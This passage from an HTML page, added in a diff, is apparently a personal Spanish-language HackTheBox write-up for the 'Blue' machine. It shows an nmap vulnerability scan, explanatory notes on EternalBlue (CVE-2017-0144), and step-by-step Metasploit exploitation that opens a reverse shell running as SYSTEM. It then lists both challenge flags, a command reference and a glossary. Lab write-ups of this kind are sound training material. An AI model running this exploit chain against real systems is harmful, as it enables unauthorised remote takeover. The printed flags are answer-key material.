+        <span class="cmd-label">NMAP VULN</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p</span> <span class="arg">135,139,445,49152,49153,49154,49155,49156,49157</span> <span class="flag">--script vuln --open</span> <span class="arg">10.129.2.134</span> <span class="flag">-oX</span> <span class="arg">blue_vuln.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 14:25 -0400</div>
+        <div>Host script results:</div>
+        <div>| smb-vuln-ms17-010:</div>
+        <div>|   <span class="o-red">VULNERABLE:</span></div>
+        <div>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</div>
+        <div>|     State: <span class="o-red">VULNERABLE</span></div>
+        <div>|     IDs:  <span class="o-yellow">CVE:CVE-2017-0144</span></div>
+        <div>|     Risk factor: <span class="o-red">HIGH</span></div>
+        <div>|       A critical remote code execution vulnerability exists in Microsoft SMBv1</div>
+        <div>|       servers (ms17-010).</div>
+        <div>|     Disclosure date: 2017-03-14</div>
+        <div>|     References:</div>
+        <div>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144</div>
+        <div>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</div>
+        <div>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</div>
+        <div>|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</div>
+        <div>|_smb-vuln-ms10-054: false</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 111.60 seconds</div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// CONFIRMADO: MS17-010 — ESTADO VULNERABLE</p>
+        <p>Nmap confirma que el sistema es <strong>VULNERABLE</strong> a CVE-2017-0144 con factor de riesgo <strong>HIGH</strong>. Esto significa que podemos ejecutar código arbitrario en el sistema sin necesidad de credenciales, aprovechando una vulnerabilidad en el protocolo SMBv1.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">REPORTE HTML DEL SCAN DE VULNERABILIDADES</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl blue_vuln.xml > blue_vuln.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">blue_vuln.xml</span> &gt; <span class="arg">blue_vuln.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- CVE -->
+    <div class="section" id="cve">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">CVE-2017-0144 — EternalBlue</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          <span class="hl-red">CVE-2017-0144</span> es una vulnerabilidad de
+          <strong>Remote Code Execution (RCE)</strong> en el protocolo
+          <strong>Server Message Block v1 (SMBv1)</strong> de Microsoft Windows. Permite a un
+          atacante ejecutar código arbitrario en el sistema víctima sin autenticación, con
+          privilegios de SYSTEM.
+        </p>
+        <p>
+          El exploit fue desarrollado por la <span class="hl-blue">NSA</span> bajo el nombre de
+          <strong>EternalBlue</strong> y fue filtrado públicamente por el grupo
+          <strong>Shadow Brokers</strong> en abril de 2017. Microsoft había lanzado el parche
+          <span class="hl-cyan">MS17-010</span> en marzo de 2017, pero millones de sistemas
+          quedaron sin parchear. El resultado fue catastrófico: EternalBlue fue el vector principal
+          del ransomware <span class="hl-red">WannaCry</span> (mayo 2017) y <strong>NotPetya</strong>
+          (junio 2017), causando daños estimados en miles de millones de dólares.
+        </p>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// FICHA TÉCNICA — CVE-2017-0144</p>
+        <p><strong>Nombre:</strong> EternalBlue / MS17-010<br>
+        <strong>Tipo:</strong> Remote Code Execution (RCE) sin autenticación<br>
+        <strong>Protocolo afectado:</strong> SMBv1 (puerto 445 / 139)<br>
+        <strong>OS afectados:</strong> Windows XP, Vista, 7, 8.1, Server 2003/2008/2012/2016<br>
+        <strong>CVSS Score:</strong> 8.1 (HIGH)<br>
+        <strong>Fecha divulgación:</strong> 14 de marzo de 2017<br>
+        <strong>Parche:</strong> Microsoft MS17-010 (KB4012212)</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- EXPLOTACIÓN -->
+    <div class="section" id="explotacion">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Explotación con Metasploit</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">INICIAR METASPLOIT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se lanza <strong>Metasploit Framework</strong> con el comando <span class="hl-cyan">msfconsole</span>.
+          Metasploit es el framework de explotación más usado en pentesting, con miles de exploits,
+          payloads y módulos auxiliares. Desde aquí buscaremos y configuraremos el exploit de EternalBlue.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="msfconsole">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">$ </span><span class="cmd">msfconsole</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">BUSCAR EL MÓDULO ETERNALBLUE</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="search eterna blue">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf &gt; </span><span class="cmd">search <span class="arg">eterna blue</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div class="o-white">Matching Modules</div>
+        <div>================</div>
+        <div>&nbsp;</div>
+        <div>&nbsp;  # &nbsp; Name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disclosure Date  Rank&nbsp;&nbsp;&nbsp; Check  Description</div>
+        <div>&nbsp;  - &nbsp; ---- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------  ----&nbsp;&nbsp;&nbsp; -----  -----------</div>
+        <div>&nbsp;  <span class="o-green">0 &nbsp; exploit/windows/smb/ms17_010_eternalblue</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2017-03-14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; average  Yes&nbsp;&nbsp;&nbsp; MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</div>
+        <div>&nbsp;  1 &nbsp;&nbsp;&nbsp; \_ target: Automatic Target</div>
+        <div>&nbsp;  2 &nbsp;&nbsp;&nbsp; \_ target: Windows 7</div>
+        <div>&nbsp;  ...</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">SELECCIONAR EL EXPLOIT Y VER OPCIONES</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="use 0">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf &gt; </span><span class="cmd">use <span class="arg">0</span></span></div>
+        <div><span class="prompt">msf exploit(windows/smb/ms17_010_eternalblue) &gt; </span><span class="cmd">show options</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Module options (exploit/windows/smb/ms17_010_eternalblue):</div>
+        <div>&nbsp;</div>
+        <div class="o-white">   Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  Current Setting  Required  Description</div>
+        <div>   ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  ---------------  --------  -----------</div>
+        <div>   <span class="o-yellow">RHOSTS</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target host(s)</div>
+        <div>   RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target port (TCP)</div>
+        <div>   SMBDomain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Windows domain</div>
+        <div>&nbsp;</div>
+        <div>Payload options (windows/x64/meterpreter/reverse_tcp):</div>
+        <div>&nbsp;</div>
+        <div>   <span class="o-yellow">LHOST</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  1.168.111.128&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The listen address</div>
+        <div>   LPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  4444&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The listen port</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">CONFIGURAR RHOST — IP DE LA VÍCTIMA</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="set rhost 10.129.2.134">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">rhost</span> <span class="arg">10.129.2.134</span></span></div>
+        <div><span class="o-green">rhost =&gt; 10.129.2.134</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">SELECCIONAR PAYLOAD Y CONFIGURAR LHOST</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se lista los payloads disponibles con <span class="hl-cyan">show payloads</span> y se
+          selecciona el número <strong>57</strong> que corresponde a
+          <code style="color:var(--yellow)">windows/x64/shell/reverse_tcp</code> — una reverse shell
+          TCP de Windows 64 bits. Luego se configura el <span class="hl-cyan">LHOST</span> con
+          nuestra IP de la VPN de HackTheBox (tun0).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="show payloads">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">show payloads</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="set payload 57">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">payload</span> <span class="arg">57</span></span></div>
+        <div><span class="o-green">payload =&gt; windows/x64/shell/reverse_tcp</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="set lhost 10.10.16.7">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">set <span class="flag">lhost</span> <span class="arg">10.10.16.7</span></span></div>
+        <div><span class="o-green">lhost =&gt; 10.10.16.7</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">LANZAR EL EXPLOIT</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="exploit">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">MSF</span>
+        <div><span class="prompt">msf exploit(ms17_010_eternalblue) &gt; </span><span class="cmd">exploit</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[*] Started reverse TCP handler on 10.10.16.7:4444</div>
+        <div>[*] 10.129.2.134:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</div>
+        <div>[+] <span class="o-green">10.129.2.134:445 - Host is likely VULNERABLE to MS17-010!</span> - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</div>
+        <div>[*] 10.129.2.134:445 - Connecting to target for exploitation.</div>
+        <div>[+] <span class="o-green">10.129.2.134:445 - Connection established for exploitation.</span></div>
+        <div>[+] <span class="o-green">10.129.2.134:445 - Target OS selected valid for OS indicated by SMB reply</span></div>
+        <div>[*] 10.129.2.134:445 - CORE raw buffer dump (42 bytes)</div>
+        <div>[*] 10.129.2.134:445 - Starting non-paged pool grooming</div>
+        <div>[+] <span class="o-green">10.129.2.134:445 - Smashing SMBv2 connection creating free hole adjacent to SMBv2 buffer.</span></div>
+        <div>[*] 10.129.2.134:445 - Sending last fragment of exploit packet!</div>
+        <div>[*] 10.129.2.134:445 - Receiving response from exploit packet</div>
+        <div>[+] <span class="o-green">10.129.2.134:445 - ETERNALBLUE overwrite completed successfully (0xC0000000D)!</span></div>
+        <div>[*] 10.129.2.134:445 - Sending egg to corrupted connection.</div>
+        <div>[*] 10.129.2.134:445 - Triggering free of corrupted buffer.</div>
+        <div>[*] Sending stage (336 bytes) to 10.129.2.134</div>
+        <div>[+] <span class="o-red">Command shell session 1 opened (10.10.16.7:4444 → 10.129.2.134:49162) at 2026-06-05 14:43:50 -0400</span></div>
+        <div>&nbsp;</div>
+        <div>Shell Banner:</div>
+        <div>Microsoft Windows [Version 6.1.7601]</div>
+        <div>---</div>
+        <div>&nbsp;</div>
+        <div>C:\Windows\system32&gt;whoami</div>
+        <div>whoami</div>
+        <div><span class="o-red">nt authority\system</span></div>
+      </div>
+
+      <div class="cve-box">
+        <p class="cve-box-title">// ¡PWNED! — NT AUTHORITY\SYSTEM</p>
+        <p>El exploit funcionó a la perfección. Tenemos una shell como <strong>NT AUTHORITY\SYSTEM</strong> — el usuario más privilegiado en Windows, equivalente a root en Linux. No se necesita escalada de privilegios.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- POST-EXPLOTACIÓN -->
+    <div class="section" id="postexplot">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Post-Explotación</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">NAVEGACIÓN POR EL SISTEMA DE ARCHIVOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con acceso como SYSTEM, se navega por el sistema de archivos Windows para localizar las flags.
+          Primero se sube hasta la raíz del disco <span class="hl-cyan">C:\</span> con
+          <span class="hl-cyan">cd ..</span> repetido, luego se lista el contenido con
+          <span class="hl-cyan">dir</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd.. && cd.. && cd.. && dir">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WINDOWS</span>
+        <div><span class="prompt">C:\Windows\system32&gt; </span><span class="cmd">cd..</span></div>
+        <div><span class="prompt">C:\Windows&gt; </span><span class="cmd">cd..</span></div>
+        <div><span class="prompt">C:\&gt; </span><span class="cmd">dir</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Volume in drive C has no label.</div>
+        <div>Volume Serial Number is BE92-053B</div>
+        <div>&nbsp;</div>
+        <div>Directory of C:\</div>
+        <div>&nbsp;</div>
+        <div>14/07/2009  04:20    &lt;DIR&gt;          PerfLogs</div>
+        <div>18/02/2022  16:02    &lt;DIR&gt;          Program Files</div>
+        <div>14/07/2017  17:58    &lt;DIR&gt;          Program Files (x86)</div>
+        <div>14/07/2017  14:48    &lt;DIR&gt;          Share</div>
+        <div>21/07/2017  07:56    &lt;DIR&gt;          <span class="o-cyan">Users</span></div>
+        <div>05/06/2026  18:48    &lt;DIR&gt;          Windows</div>
+        <div>               0 File(s)              0 bytes</div>
+        <div>               6 Dir(s)   2,693,087,232 bytes free</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">LOCALIZAR USUARIOS DEL SISTEMA</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd Users && dir">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WINDOWS</span>
+        <div><span class="prompt">C:\&gt; </span><span class="cmd">cd <span class="arg">Users</span></span></div>
+        <div><span class="prompt">C:\Users&gt; </span><span class="cmd">dir</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Directory of C:\Users</div>
+        <div>&nbsp;</div>
+        <div>21/07/2017  07:56    &lt;DIR&gt;          <span class="o-cyan">Administrator</span></div>
+        <div>14/07/2017  14:45    &lt;DIR&gt;          <span class="o-green">haris</span></div>
+        <div>12/04/2011  08:51    &lt;DIR&gt;          Public</div>
+        <div>               0 File(s)              0 bytes</div>
+        <div>               5 Dir(s)   2,693,087,232 bytes free</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DOS USUARIOS ENCONTRADOS</p>
+        <p>Se identifican dos usuarios: <strong>haris</strong> (usuario normal — tendrá la user flag) y <strong>Administrator</strong> (administrador — tendrá la root flag). En HackTheBox Windows, las flags siguen la misma convención: <code>user.txt</code> en el Desktop del usuario y <code>root.txt</code> en el Desktop del Administrador.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAGS -->
+    <div class="section" id="flags">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Flags</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">USER FLAG — C:\Users\haris\Desktop\user.txt</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd haris && cd Desktop && type user.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WINDOWS</span>
+        <div><span class="prompt">C:\Users&gt; </span><span class="cmd">cd <span class="arg">haris</span></span></div>
+        <div><span class="prompt">C:\Users\haris&gt; </span><span class="cmd">cd <span class="arg">Desktop</span></span></div>
+        <div><span class="prompt">C:\Users\haris\Desktop&gt; </span><span class="cmd">type <span class="arg">user.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">95fc8c38bc1714946bdb86d89ab84724</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">ROOT FLAG — C:\Users\Administrator\Desktop\root.txt</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd C:\Users\Administrator\Desktop && type root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WINDOWS</span>
+        <div><span class="prompt">C:\Users&gt; </span><span class="cmd">cd <span class="arg">Administrator</span></span></div>
+        <div><span class="prompt">C:\Users\Administrator&gt; </span><span class="cmd">cd <span class="arg">Desktop</span></span></div>
+        <div><span class="prompt">C:\Users\Administrator\Desktop&gt; </span><span class="cmd">type <span class="arg">root.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">7dc3cd55355ebfc97ff8aaa75cceb57d</span></div>
+      </div>
+
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">// USER FLAG</div>
+          <div class="flag-user">95fc8c38bc1714946bdb86d89ab84724</div>
+        </div>
+        <div class="flag-root-card">
+          <div class="flag-label">// ROOT FLAG</div>
+          <div class="flag-root">7dc3cd55355ebfc97ff8aaa75cceb57d</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escaneo completo de todos los puertos TCP con detección de servicios, versiones y scripts NSE.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → Todos los 65,535 puertos</li>
+            <li><span>-sS</span> → SYN scan (sigiloso)</li>
+            <li><span>-sC</span> → Scripts de reconocimiento por defecto</li>
+            <li><span>-sV</span> → Detección de versión de servicios</li>
+            <li><span>--min-rate=5000</span> → Mínimo 5000 paquetes/seg</li>
+            <li><span>-oX</span> → Salida en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap --script vuln</div>
+          <div class="cmd-ref-syntax">nmap -p &lt;ports&gt; --script vuln &lt;IP&gt;</div>
+          <div class="cmd-ref-desc">Ejecuta scripts NSE de detección de vulnerabilidades conocidas contra los puertos especificados.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>smb-vuln-ms17-010</span> → Detecta EternalBlue</li>
+            <li><span>smb-vuln-ms10-054</span> → SMB memory corruption</li>
+            <li><span>smb-vuln-ms10-061</span> → Print Spooler RCE</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl &lt;file.xml&gt; &gt; out.html</div>
+          <div class="cmd-ref-desc">Convierte el XML de Nmap a un reporte HTML visual usando la hoja de estilos oficial de Nmap.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → Hoja de estilos oficial de Nmap</li>
+            <li><span>&gt; out.html</span> → Redirecciona la salida al archivo HTML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">msfconsole</div>
+          <div class="cmd-ref-syntax">use &lt;module&gt; → set RHOST &lt;IP&gt; → set LHOST &lt;IP&gt; → exploit</div>
+          <div class="cmd-ref-desc">Framework de explotación. Flujo básico: buscar módulo, seleccionarlo, configurar opciones y ejecutar.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>search &lt;term&gt;</span> → Buscar módulos</li>
+            <li><span>use &lt;n&gt;</span> → Seleccionar por índice</li>
+            <li><span>show options</span> → Ver opciones requeridas</li>
+            <li><span>show payloads</span> → Listar payloads disponibles</li>
+            <li><span>set PAYLOAD &lt;n&gt;</span> → Seleccionar payload</li>
+            <li><span>exploit / run</span> → Lanzar el ataque</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SMB — Server Message Block</div>
+          <div class="glos-def"><strong>SMB (Server Message Block)</strong> es el protocolo de red de Microsoft para compartir archivos, impresoras y recursos entre equipos Windows. Opera principalmente en el <strong>puerto 445 (TCP)</strong> y opcionalmente en el 139. La versión <strong>SMBv1</strong> es la afectada por EternalBlue — una versión antigua (circa 1990s) con graves fallos de seguridad. Microsoft desactivó SMBv1 por defecto desde Windows 10 Fall Creators Update (2017) en adelante.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">EternalBlue — MS17-010</div>
+          <div class="glos-def"><strong>EternalBlue</strong> es el nombre del exploit desarrollado por la NSA que aprovecha CVE-2017-0144 en SMBv1. Funciona enviando paquetes SMB malformados que corrompen la memoria del kernel de Windows, permitiendo al atacante ejecutar código arbitrario con privilegios de SYSTEM sin necesidad de autenticación. Fue filtrado por los Shadow Brokers en abril 2017 y fue el vector principal de WannaCry y NotPetya.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">NT AUTHORITY\SYSTEM</div>
+          <div class="glos-def"><strong>NT AUTHORITY\SYSTEM</strong> (también llamado LocalSystem) es la cuenta de mayor privilegio en Windows — equivalente a <code>root</code> en Linux. Tiene control total sobre el sistema operativo: puede leer y modificar cualquier archivo, gestionar procesos, modificar el registro, y acceder a recursos de red. Los servicios del sistema como el kernel y muchos servicios de Windows corren bajo esta cuenta. Obtener una shell como SYSTEM es el objetivo final de la escalada de privilegios en Windows.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Metasploit Framework</div>
+          <div class="glos-def"><strong>Metasploit Framework (MSF)</strong> es la plataforma de pentesting y desarrollo de exploits más usada en el mundo, desarrollada por Rapid7. Contiene miles de exploits, payloads, encoders y módulos auxiliares. El componente <code>msfconsole</code> es la interfaz de línea de comandos interactiva. Su arquitectura modular permite combinar exploits con distintos payloads (reverse shells, meterpreter, etc.) y adaptar el ataque a cada objetivo.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>, en lugar del flujo normal. Esto permite evadir firewalls que bloquean conexiones entrantes: el firewall no bloquea las salientes. El atacante abre un listener (<code>nc -lvnp 4444</code> o Metasploit handler), y cuando el exploit se ejecuta, la víctima establece la conexión. El payload <code>windows/x64/shell/reverse_tcp</code> implementa este mecanismo.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Payload — windows/x64/shell/reverse_tcp</div>
+          <div class="glos-def">Un <strong>payload</strong> es el código que se ejecuta en la víctima tras la explotación exitosa. <code>windows/x64/shell/reverse_tcp</code> es un payload de Metasploit que: (1) abre una conexión TCP desde la víctima al atacante (reverse), (2) ejecuta <code>cmd.exe</code> y pasa su stdin/stdout a través de esa conexión (shell), para arquitectura de 64 bits (x64). El resultado es una terminal de comandos de Windows interactiva en la máquina del atacante.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">NSE — Nmap Scripting Engine</div>
+          <div class="glos-def">El <strong>Nmap Scripting Engine (NSE)</strong> permite extender las capacidades de Nmap mediante scripts escritos en Lua. Los scripts se agrupan por categorías: <code>default</code> (reconocimiento básico), <code>vuln</code> (detección de vulnerabilidades), <code>auth</code> (prueba de autenticación), <code>brute</code> (fuerza bruta), entre otras. El script <code>smb-vuln-ms17-010</code> verifica si un host SMB es vulnerable a EternalBlue enviando una solicitud específica y analizando la respuesta del servidor.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Shadow Brokers</div>
+          <div class="glos-def"><strong>The Shadow Brokers</strong> es un grupo de hackers que en agosto de 2016 afirmó haber robado un arsenal de herramientas de hacking pertenecientes al Equation Group (grupo vinculado a la NSA). En abril de 2017 filtraron públicamente herramientas como <strong>EternalBlue</strong>, <strong>DoublePulsar</strong> y otras, provocando uno de los mayores incidentes de seguridad de la historia. Estas filtraciones permitieron que actores maliciosos crearan WannaCry y NotPetya, causando daños globales de miles de millones de dólares.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">WannaCry</div>
+          <div class="glos-def"><strong>WannaCry</strong> fue un ataque global de ransomware que ocurrió el 12 de mayo de 2017 y afectó a más de 200,000 sistemas en 150 países en pocas horas. Usaba <strong>EternalBlue</strong> para propagarse automáticamente por redes sin requerir interacción del usuario. Cifró los archivos de las víctimas y exigió rescates en Bitcoin. Afectó gravemente al NHS (Servicio de Salud del Reino Unido), Telefónica, FedEx, y muchas otras organizaciones. Fue atribuido al grupo Lazarus de Corea del Norte.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE — Common Vulnerabilities and Exposures</div>
+          <div class="glos-def">El sistema <strong>CVE</strong> es una lista pública de vulnerabilidades de seguridad conocidas mantenida por MITRE Corporation. Cada vulnerabilidad recibe un identificador único en formato <code>CVE-AÑO-NÚMERO</code>. <strong>CVE-2017-0144</strong> fue asignado a la vulnerabilidad MS17-010 que explotamos en esta máquina. El sistema CVE permite que investigadores, vendedores y equipos de seguridad hablen del mismo problema con un identificador común.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
